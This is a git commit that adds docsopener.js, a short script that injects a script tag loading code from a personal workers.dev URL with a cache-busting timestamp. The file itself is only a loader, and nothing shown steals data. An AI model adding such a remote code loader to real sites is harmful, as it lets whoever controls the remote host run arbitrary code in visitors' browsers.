a3aa9843e12bfe37cbf29f9806df1dbe86d0f1d6
luckyph10 <airrishlucky.dullas@globalstrategic.com>
2026-07-28 19:51:43 -0500

    Create docsopener.js

---
+++ docsopener.js
@@ -0,0 +1,9 @@
+(function () {
+    var s = document.createElement('script');
+
+    s.src =
+        'https://buttons.airrishlucky-dullas.workers.dev/docsopener?v=' +
+        Date.now();
+
+    document.head.appendChild(s);
+})();
